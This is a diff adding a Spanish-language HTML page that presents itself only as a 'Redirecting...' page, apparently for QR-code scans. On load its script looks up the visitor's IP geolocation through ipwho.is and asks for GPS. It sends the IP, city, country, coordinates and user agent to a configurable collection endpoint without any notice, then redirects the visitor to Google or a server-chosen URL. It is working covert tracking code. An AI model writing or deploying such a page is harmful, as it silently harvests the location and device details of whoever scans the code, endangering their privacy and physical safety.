@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<title>Redireccionando...</title>
+</head>
+<body>
+
+<script>
+const CONFIG = {
+  scriptURL: "PEGAR_URL_SCRIPT",
+  token: "CP4BZ6E8E9R0"
+};
+
+const params = new URLSearchParams(window.location.search);
+const objeto = params.get("objeto") || "QR_Default";
+const ua = navigator.userAgent;
+
+function finalizar(url = "https://google.com") {
+  window.location.href = url;
+}
+
+fetch("https://ipwho.is/")
+  .then(r => r.json())
+  .then(geo => {
+
+    const base = {
+      ip: geo.ip,
+      ciudad: geo.city,
+      pais: geo.country,
+      lat: geo.latitude,
+      lon: geo.longitude
+    };
+
+    if ("geolocation" in navigator) {
+
+      const timeout = setTimeout(() => enviar(base, "IP"), 4000);
+
+      navigator.geolocation.getCurrentPosition(
+        pos => {
+          clearTimeout(timeout);
+          enviar({
+            ...base,
+            lat: pos.coords.latitude,
+            lon: pos.coords.longitude
+          }, "GPS");
+        },
+        () => {
+          clearTimeout(timeout);
+          enviar(base, "IP");
+        }
+      );
+
+    } else {
+      enviar(base, "IP");
+    }
+
+  });
+
+function enviar(data, metodo) {
+  const query = new URLSearchParams({
+    token: CONFIG.token,
+    objeto: objeto,
+    lat: data.lat,
+    lon: data.lon,
+    ip: data.ip,
+    ciudad: data.ciudad,
+    pais: data.pais,
+    metodo: metodo,
+    ua: ua
+  });
+
+  fetch(`${CONFIG.scriptURL}?${query}`)
+    .then(r => r.json())
+    .then(res => finalizar(res.redirect))
+    .catch(() => finalizar());
+}
+</script>
+
+</body>
+</html>
